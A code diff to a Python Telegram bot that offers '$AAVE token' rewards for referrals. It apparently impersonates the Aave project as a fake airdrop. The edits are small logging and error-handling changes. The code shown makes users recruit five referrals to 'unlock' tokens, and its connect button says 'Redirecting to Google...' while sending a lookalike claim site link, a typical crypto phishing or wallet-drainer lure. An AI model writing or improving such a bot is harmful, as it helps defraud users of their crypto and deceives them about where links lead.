@@ -40,20 +40,18 @@ async def webapp_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         user_id = update.effective_user.id
         data = update.message.web_app_data.data
 
-        logger.info(f"User {user_id} sent WebApp data: {data}")
+        logger.info(f"Received WebApp data from user {user_id}: {data}")
 
         if data == 'generate_referral':
             username = update.effective_user.username or str(user_id)
             referral_link = f"https://t.me/AAVEclaim_bot?start=referral_{username}"
             
-            # Send referral link to the user
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
                 text=f"Your referral link is: {referral_link}"
             )
             logger.info(f"Sent referral link to user {user_id}: {referral_link}")
 
-            # Retrieve referred users and send them
             referred_users = get_referred_users(user_id)
             referred_users_list = "\n".join([f"- {user}" for user in referred_users]) or "No referred users yet."
             await context.bot.send_message(
@@ -65,13 +63,17 @@ async def webapp_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         elif data == 'check_wallet':
             user_data = get_user_data(user_id)
             referrals = user_data['referrals']
-            balance = referrals * 22  # Assume each referral gives 22 tokens
+            balance = referrals * 22
             if referrals >= 5:
                 await context.bot.send_message(chat_id=update.effective_chat.id, text=f"You have {balance} $AAVE tokens.")
                 logger.info(f"User {user_id} has enough referrals: {referrals}. Balance: {balance}.")
             else:
                 await context.bot.send_message(chat_id=update.effective_chat.id, text="You need at least 5 referrals to unlock rewards.")
                 logger.info(f"User {user_id} does not have enough referrals: {referrals}.")
+        else:
+            logger.warning(f"Unrecognized data received from user {user_id}: {data}")
+    else:
+        logger.warning("No WebApp data found in the update.")
 
 # Function to handle connect button clicks
 async def connect_buttons_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -82,6 +84,7 @@ async def connect_buttons_handler(update: Update, context: ContextTypes.DEFAULT_
             await context.bot.send_message(chat_id=update.effective_chat.id, text="Redirecting to Google...")
             await context.bot.send_message(chat_id=update.effective_chat.id, text="https://aavetoks-claim.site")
             logger.info(f"User {update.effective_user.id} clicked connect button.")
+
     else:
         logger.warning(f"No message text found in the update: {update}")
 
